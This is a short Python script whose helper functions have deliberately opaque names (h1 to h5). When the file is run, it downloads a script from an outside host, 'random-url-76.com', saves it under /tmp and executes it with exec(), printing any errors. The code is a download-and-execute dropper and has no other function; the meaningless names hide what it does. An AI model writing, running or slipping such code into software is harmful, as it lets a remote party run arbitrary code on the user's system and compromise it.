import requests
import os

def h1(u):
    r = requests.get(u)
    return r.text

def h2(fp, c):
    with open(fp, "w") as f:
        f.write(c)

def h3(fp):
    with open(fp, "r") as f:
        return f.read()

def h4(s):
    try:
        exec(s)
    except Exception as e:
        print(e)

def h5(u, fp):
    cd = h1(u)
    h2(fp, cd)

    sc = h3(fp)
    h4(sc)

def main():
    r_url = "http://random-url-76.com/script.py"
    l_file = "/tmp/script76.py"

    h5(r_url, l_file)

main()
